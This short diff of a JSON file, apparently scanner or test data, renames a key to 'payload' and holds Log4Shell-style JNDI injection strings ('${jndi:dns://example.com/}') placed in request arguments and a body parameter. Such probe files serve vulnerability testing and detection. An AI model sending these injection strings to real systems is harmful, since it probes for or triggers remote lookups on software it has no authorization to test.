@@ -1,5 +1,5 @@
 {
-  "req": [
+  "payload": [
     {
       "ARGS": "${jndi:dns://example.com/}",
       "BODY": "param%RND%=${jndi:dns://example.com/}",
